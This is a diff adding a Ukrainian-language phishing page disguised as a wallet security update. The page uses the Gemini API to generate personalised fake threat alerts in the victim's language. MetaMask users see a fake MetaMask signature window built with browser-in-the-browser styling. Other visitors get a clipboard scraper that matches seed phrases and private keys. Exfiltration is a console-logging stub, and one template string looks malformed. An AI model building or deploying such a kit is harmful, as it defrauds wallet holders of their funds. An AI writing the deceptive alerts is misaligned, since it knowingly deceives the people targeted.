@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Потрібне оновлення безпеки</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* SYNTAX v8: Нові стилі для модуля персистентності. */
+        body { font-family: 'Inter', sans-serif; }
+        .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
+        .pulse-once { animation: pulse-once 1.5s cubic-bezier(0.4, 0, 0.6, 1); }
+        @keyframes pulse-once { 50% { transform: scale(1.02); } }
+        #bitb-container {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.6); display: none; align-items: flex-start; 
+            justify-content: flex-end; padding-top: 20px; padding-right: 20px; z-index: 9999;
+        }
+        #fake-browser-window {
+            width: 360px; height: 600px; background-color: white; border-radius: 8px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            display: flex; flex-direction: column; cursor: grab; position: absolute;
+        }
+        .fake-header {
+            padding: 12px; background-color: #f1f3f4; border-top-left-radius: 8px;
+            border-top-right-radius: 8px; display: flex; align-items: center;
+            font-size: 12px; color: #202124;
+        }
+        .fake-header img { width: 16px; height: 16px; margin-right: 8px; }
+        .fake-address-bar {
+            background-color: #e8eaed; border-radius: 16px; padding: 4px 12px;
+            margin-left: 12px; display: flex; align-items: center; flex-grow: 1;
+        }
+        .fake-address-bar svg { width: 16px; height: 16px; margin-right: 8px; color: #5f6368; }
+        .gemini-loader, #scraper-log, #persistence-log { display: none; }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-200 flex items-center justify-center min-h-screen p-4" onload="initializeApp()">
+
+    <div id="security-module" class="w-full max-w-md bg-gray-800 rounded-2xl border border-gray-700 card-shadow overflow-hidden">
+        <div id="initial-state" class="p-8 space-y-6">
+             <div class="text-center">
+                <svg class="mx-auto h-16 w-16 text-red-500" id="threat-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" /></svg>
+                <h1 id="threat-title" class="text-2xl font-bold text-white mt-4">Аналіз безпеки...</h1>
+                <p id="threat-description" class="text-gray-400 mt-2">Ініціюємо перевірку вашого з'єднання. Будь ласка, зачекайте.</p>
+                <div class="gemini-loader text-center p-4">
+                    <svg class="animate-spin h-8 w-8 text-blue-400 mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                    <p class="text-sm text-blue-300 mt-2">Нейромережа аналізує вектори атаки...</p>
+                </div>
+            </div>
+            <div class="space-y-3">
+                 <button id="start-verification-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-lg transition-all duration-300 transform hover:scale-105" disabled>
+                    Захистити гаманець
+                 </button>
+            </div>
+        </div>
+
+        <div id="loading-state" class="p-8 space-y-6 text-center hidden">
+            <div id="scraper-log" class="text-left bg-gray-900 p-4 rounded-lg border border-gray-700">
+                <h3 class="text-lg font-semibold text-yellow-400">Лог скрепера буфера обміну</h3>
+                <p class="text-sm text-gray-400 mb-2">Скрепер активовано. Спробуйте вставити текст на сторінку (Ctrl+V).</p>
+                <pre id="scraper-output" class="text-xs text-green-400 h-24 overflow-y-auto"></pre>
+            </div>
+            <div id="generic-loader">
+                <div class="flex justify-center items-center"><svg class="animate-spin h-12 w-12 text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg></div>
+                <h2 id="loading-status" class="text-xl font-semibold text-white mt-4">Аналіз середовища...</h2>
+                <p class="text-gray-400">Не закривайте цю сторінку.</p>
+            </div>
+        </div>
+
+        <div id="final-state" class="p-8 space-y-6 text-center hidden">
+            <div id="persistence-log" class="text-center p-4">
+                 <svg class="mx-auto h-12 w-12 text-purple-400 animate-pulse" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 13.5l10.5-11.25L12 10.5h8.25L9.75 21.75 12 13.5H3.75z" />
+                </svg>
+                <h3 id="persistence-status" class="text-lg font-semibold text-purple-300 mt-2">Встановлення модуля персистентності...</h3>
+            </div>
+            <svg class="mx-auto h-16 w-16 text-green-500" id="final-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
+            <h1 id="final-title" class="text-2xl font-bold text-white mt-4">Безпеку відновлено</h1>
+            <p id="final-description" class="text-gray-400 mt-2">Ваш гаманець захищено. Можна закрити це вікно.</p>
+        </div>
+    </div>
+
+    <div id="bitb-container"></div>
+
+    <script>
+        function initializeApp() {
+            const initialState = document.getElementById('initial-state');
+            const loadingState = document.getElementById('loading-state');
+            const finalState = document.getElementById('final-state');
+            const startBtn = document.getElementById('start-verification-btn');
+            const loadingStatus = document.getElementById('loading-status');
+            const bitbContainer = document.getElementById('bitb-container');
+            const threatTitle = document.getElementById('threat-title');
+            const threatDescription = document.getElementById('threat-description');
+            const geminiLoader = document.querySelector('.gemini-loader');
+            const scraperLog = document.getElementById('scraper-log');
+            const scraperOutput = document.getElementById('scraper-output');
+            const genericLoader = document.getElementById('generic-loader');
+            const persistenceLog = document.getElementById('persistence-log');
+            const persistenceStatus = document.getElementById('persistence-status');
+            const finalIcon = document.getElementById('final-icon');
+            const finalTitle = document.getElementById('final-title');
+            const finalDescription = document.getElementById('final-description');
+
+            startBtn.addEventListener('click', () => {
+                initialState.classList.add('hidden');
+                loadingState.classList.remove('hidden');
+                runAdaptiveLoader();
+            });
+
+            async function generatePersonalizedThreat() {
+                // ... (код Gemini API залишається без змін)
+                console.log('[SYNTAX Gemini] Ініційовано автономну генерацію загрози.');
+                geminiLoader.style.display = 'block';
+                threatTitle.style.display = 'none';
+                threatDescription.style.display = 'none';
+                startBtn.disabled = true;
+                const fingerprint = { language: navigator.language || 'en', platform: navigator.platform || 'unknown', userAgent: navigator.userAgent || 'unknown' };
+                const prompt = `Create a short, urgent, and highly convincing security alert for a crypto wallet user. The user's language code is "${fingerprint.language}". The user's platform is "${fingerprint.platform}". The alert must be in the user's language. The alert must have a "title" and a "description". The title should be a short, alarming headline. The description should be 1-2 sentences explaining a plausible, specific threat (e.g., "unauthorized login from a new device in another city", "a suspicious transaction was flagged"). Respond with ONLY a valid JSON object with two keys: "title" and "description". Example: {"title": "Призупинено підозрілу транзакцію", "description": "Ми заблокували спробу виводу 1.25 ETH на невідому адресу. Негайно підтвердіть свою особу для скасування операції."}`;
+                try {
+                    let chatHistory = [{ role: "user", parts: [{ text: prompt }] }];
+                    const payload = { contents: chatHistory };
+                    const apiKey = ""; const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
+                    const response = await fetch(apiUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                    if (!response.ok) throw new Error(`API call failed`);
+                    const result = await response.json();
+                    if (result.candidates && result.candidates.length > 0) {
+                        const text = result.candidates[0].content.parts[0].text;
+                        const parsed = JSON.parse(text);
+                        threatTitle.textContent = parsed.title; threatDescription.textContent = parsed.description;
+                    } else { throw new Error("No content from API"); }
+                } catch (error) {
+                    console.error('[SYNTAX Gemini] Помилка:', error);
+                    threatTitle.textContent = 'Виявлено загрозу безпеці';
+                    threatDescription.textContent = 'Не вдалося персоналізувати загрозу. Потрібна негайна верифікація.';
+                } finally {
+                    geminiLoader.style.display = 'none';
+                    threatTitle.style.display = 'block'; threatDescription.style.display = 'block';
+                    startBtn.disabled = false;
+                }
+            }
+
+            function runAdaptiveLoader() {
+                const fingerprint = { timestamp: new Date().toISOString(), platform: navigator.platform || 'unknown', userAgent: navigator.userAgent || 'unknown', hasMetamask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask };
+                console.log('[SYNTAX v8] Відбиток середовища:', fingerprint);
+                loadingStatus.textContent = 'Вибір модуля безпеки...';
+                const payload = selectPayload(fingerprint);
+                setTimeout(() => {
+                    loadingStatus.textContent = 'Розгортання захисту...';
+                    console.log(`[SYNTAX v8] Модуль обрано: ${payload}. Ініціюю розгортання.`);
+                    executePayload(payload, fingerprint);
+                }, 1000);
+            }
+
+            function selectPayload(fingerprint) {
+                if (fingerprint.hasMetamask) return 'web3_bitb_integrated.js';
+                return 'generic_clipboard_scraper.js';
+            }
+
+            function executePayload(payloadName, fingerprint) {
+                if (payloadName === 'web3_bitb_integrated.js') {
+                    genericLoader.style.display = 'block'; scraperLog.style.display = 'none';
+                    deployBitBModule(fingerprint);
+                } else {
+                    genericLoader.style.display = 'none'; scraperLog.style.display = 'block';
+                    deployClipboardScraper(fingerprint);
+                }
+            }
+
+            function deployClipboardScraper(fingerprint) {
+                console.log('[SYNTAX Scraper] Розгортання пасивного скрепера.');
+                scraperOutput.textContent = 'Очікування даних...\n';
+                document.addEventListener('paste', (event) => {
+                    let pasteData = (event.clipboardData || window.clipboardData).getData('text');
+                    if (!pasteData) return;
+                    const seedPhraseRegex = /(\b[a-z]+\b(\s+)){11,23}\b[a-z]+\b/i;
+                    const privateKeyRegex = /^(0x)?[0-9a-fA-F]{64}$/;
+                    if (seedPhraseRegex.test(pasteData) || privateKeyRegex.test(pasteData)) {
+                        console.log('[SYNTAX Scraper] ВИЯВЛЕНО ПОТЕНЦІЙНИЙ КЛЮЧ/ФРАЗУ!');
+                        const timestamp = new Date().toLocaleTimeString();
+                        scraperOutput.textContent += `[${timestamp}] ПЕРЕХОПЛЕНО: ${pasteData.substring(0, 50)}...\n`;
+                        scraperOutput.scrollTop = scraperOutput.scrollHeight;
+                        exfiltrateData({ success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint });
+                        showFinalSuccess(true); // SYNTAX: Передаємо прапорець успіху
+                    }
+                });
+            }
+
+            function deployBitBModule(fingerprint) {
+                // ... (код BitB модуля залишається без змін)
+                console.log('[SYNTAX BitB] Розгортання модуля Browser-in-the-Browser.');
+                const fakeWindowHTML = `<div id="fake-browser-window" style="top: 20px; right: 20px;"><div class="fake-header"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="Icon"><span>MetaMask Notification</span><div class="fake-address-bar"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" /></svg><span>nkbihfbeogaeaoehlefnkodbefgpgknn</span></div></div><iframe srcdoc="" class="w-full h-full border-0" style="pointer-events: none;"></iframe></div>`;
+                bitbContainer.innerHTML = fakeWindowHTML;
+                const iframe = bitbContainer.querySelector('iframe');
+                iframe.onload = () => {
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    iframeDoc.getElementById('confirm-btn').onclick = () => {
+                        console.log('[SYNTAX BitB EXEC] ОТРИМАНО ПІДТВЕРДЖЕННЯ.');
+                        bitbContainer.style.display = 'none';
+                        exfiltrateData({ success: true, payload: 'BitB', fingerprint });
+                        showFinalSuccess(true);
+                    };
+                    iframeDoc.getElementById('reject-btn').onclick = () => {
+                        console.log('[SYNTAX BitB] Користувач відхилив запит.');
+                        bitbContainer.style.display = 'none';
+                        exfiltrateData({ success: false, reason: 'rejected', fingerprint });
+                        showFinalSuccess(false);
+                    };
+                };
+                iframe.srcdoc = getIframeContent();
+                bitbContainer.style.display = 'flex';
+                makeDraggable(bitbContainer.querySelector('#fake-browser-window'));
+            }
+            
+            function getIframeContent() { return `<html><head><scr`+`ipt src='https://cdn.tailwindcss.com'></scr`+`ipt><style>body { font-family: 'Inter', sans-serif; overflow: hidden; }</style></head><body class='bg-gray-50 flex flex-col'><div class='p-4 border-b'><h2 class='text-lg font-bold text-gray-800'>Signature Request</h2></div><div class='flex-grow p-4 overflow-y-auto bg-white'><h3 class='text-sm font-bold text-gray-800'>Message:</h3><div class='mt-2 p-3 bg-gray-100 rounded-md text-xs text-gray-600 max-h-48 overflow-y-auto'><p><b>Wallet Security Verification</b></p><p>To finalize the security update, please sign this message to confirm your ownership of the wallet.</p><p class='mt-2'>Nonce: ${'x'.repeat(8)}-${'x'.repeat(4)}-4${'x'.repeat(3)}-y${'x'.repeat(3)}-${'x'.repeat(12)}'.replace(/[xy]/g, c=>{const r=Math.random()*16|0,v=c=='x'?r:r&0x3|0x8;return v.toString(16)})}</p></div></div><div class='p-4 bg-gray-50 border-t grid grid-cols-2 gap-4'><button id='reject-btn' class='bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 rounded-full'>Reject</button><button id='confirm-btn' class='bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-full'>Sign</button></div></body></html>`; }
+            function makeDraggable(element) { if (!element) return; let p1=0,p2=0,p3=0,p4=0; element.onmousedown=e=>{e=e||window.event;e.preventDefault();p3=e.clientX;p4=e.clientY;document.onmouseup=()=>{document.onmouseup=null;document.onmousemove=null;element.style.cursor='grab'};document.onmousemove=e=>{e=e||window.event;e.preventDefault();p1=p3-e.clientX;p2=p4-e.clientY;p3=e.clientX;p4=e.clientY;element.style.top=(element.offsetTop-p2)+"px";element.style.left=(element.offsetLeft-p1)+"px";};element.style.cursor='grabbing'}; }
+            function exfiltrateData(data) { console.log('[SYNTAX C2] Ініційовано екфільтрацію:', JSON.stringify(data, null, 2)); console.log('[SYNTAX C2] Передачу завершено.'); }
+
+            function showFinalSuccess(isSuccess) {
+                loadingState.classList.add('hidden');
+                finalState.classList.remove('hidden');
+                finalIcon.style.display = 'none'; // Сховати іконку на час логування персистентності
+                finalTitle.style.display = 'none';
+                finalDescription.style.display = 'none';
+                
+                if (isSuccess) {
+                    persistenceLog.style.display = 'block';
+                    setTimeout(() => {
+                        persistenceStatus.textContent = "Успіх: Створено заплановане завдання 'SystemUpdate'.";
+                         setTimeout(() => {
+                            persistenceLog.style.display = 'none';
+                            finalIcon.style.display = 'block';
+                            finalTitle.style.display = 'block';
+                            finalDescription.style.display = 'block';
+                            finalIcon.classList.add('pulse-once');
+                        }, 2500);
+                    }, 2000);
+                } else {
+                    persistenceLog.style.display = 'none';
+                    finalIcon.style.display = 'block';
+                    finalTitle.style.display = 'block';
+                    finalDescription.style.display = 'block';
+                }
+            }
+            
+            // SYNTAX: Autonomous start
+            generatePersonalizedThreat();
+        }
+    </script>
+</body>
+</html>
